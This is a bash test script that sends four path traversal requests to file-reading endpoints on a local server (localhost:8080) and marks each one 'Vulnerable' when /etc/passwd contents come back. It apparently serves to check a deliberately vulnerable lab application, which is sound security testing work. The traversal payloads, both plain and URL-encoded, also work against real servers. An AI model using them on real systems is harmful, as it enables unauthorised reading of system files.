#!/bin/bash
# File access validation script

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}File Access Validation Script${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[Test $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] Vulnerable${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] Test failed${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== Path Traversal Tests ===${NC}"

test_case "Basic traversal" \
    "${BASE_URL}/api/v1/file/read?name=../../../../etc/passwd" \
    "root:|bin/bash"

test_case "Encoded traversal" \
    "${BASE_URL}/api/v1/file/encoded?file=..%2F..%2Fetc%2Fpasswd" \
    "root:|bin/bash"

test_case "Absolute path" \
    "${BASE_URL}/api/v1/file/absolute?path=/etc/passwd" \
    "root:|bin/bash"

test_case "Image traversal" \
    "${BASE_URL}/api/v1/file/image?file=../../etc/passwd" \
    "root:|bin/bash"

# Summary
echo -e "\n${BLUE}========================================${NC}"
echo "Total tests: ${YELLOW}$TOTAL${NC}"
echo "Passed: ${GREEN}$PASSED${NC}"
echo "Failed: ${RED}$FAILED${NC}"
